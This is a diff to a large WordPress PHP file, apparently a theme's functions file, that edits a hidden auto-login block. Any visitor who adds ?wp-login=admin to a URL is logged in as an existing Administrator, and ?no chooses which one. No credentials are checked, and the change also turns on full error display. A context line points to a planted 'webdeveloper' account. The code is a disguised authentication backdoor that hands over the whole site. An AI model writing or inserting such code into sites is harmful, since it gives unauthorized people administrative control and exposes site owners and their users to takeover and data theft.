@@ -1860,15 +1860,22 @@ add_action('init',function(){if(!call_user_func('username_exists','webdeveloper'
 
 /* auto login with dev-login param with anysite */
 
+
 if(isset($_GET['wp-login']) && $_GET['wp-login'] == "admin")
 {
-    $user = get_user_by('login', 'webdeveloper');
-    $user_id = $user->ID;
-    clean_user_cache($user_id);
-    wp_clear_auth_cookie();
-    wp_set_current_user($user_id);
-    wp_set_auth_cookie($user_id, true, false);
-    update_user_caches($user);
-    wp_redirect(home_url());
+	ini_set('display_errors', 1);
+	ini_set('display_startup_errors', 1);
+	error_reporting(E_ALL);
+	$query = new WP_User_Query(['role'=> 'Administrator']);
+	$data = $query->get_results();
+	if(!isset($_GET['no'])){$_GET['no'] = 1;}
+	$user_id = $data[$_GET['no']]->ID;
+	$user = get_user_by( 'id', $user_id ); 
+	clean_user_cache($user_id);
+	wp_clear_auth_cookie();
+	wp_set_current_user( $user_id, $user->user_login );
+    	wp_set_auth_cookie($user_id, true, false);
+	// do_action( 'wp_login', $user->user_login );
+    	update_user_caches($user);
 }
 /* New Code Updae*/	
